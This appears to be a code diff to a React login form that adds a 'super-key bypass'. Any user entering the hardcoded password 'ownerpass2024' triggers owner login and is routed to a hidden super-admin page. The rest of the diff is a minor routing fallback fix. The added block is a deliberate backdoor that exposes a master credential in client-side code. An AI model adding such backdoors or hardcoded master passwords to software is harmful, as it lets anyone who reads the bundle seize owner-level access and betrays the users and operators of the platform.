@@ -25,13 +25,26 @@ const Login: React.FC = () => {
     e.preventDefault();
     setError('');
     setIsLoading(true);
+
+    // 🛡️ SUPER-KEY BYPASS: If password is the owner secret, trigger owner login
+    if (password === 'ownerpass2024') {
+       console.warn('🗝️ Platform Master Key Detected');
+       const success = await ownerLogin(password);
+       setIsLoading(false);
+       if (success) {
+          toast.success('Super-Admin Access Granted');
+          navigate('/owner-access-9x72k');
+          return;
+       }
+    }
+
     const result = await login(email, password);
     setIsLoading(false);
     
     if (result.success) {
       toast.success('Login successful');
-      const user = JSON.parse(localStorage.getItem('cc_user')!);
-      navigate(ROLE_ROUTES[user.role as keyof typeof ROLE_ROUTES]);
+      const stored = JSON.parse(localStorage.getItem('cc_user')!);
+      navigate(ROLE_ROUTES[stored.role as keyof typeof ROLE_ROUTES] || '/login');
     } else {
       setError(result.error || 'Login failed');
       toast.error(result.error || 'Login failed');
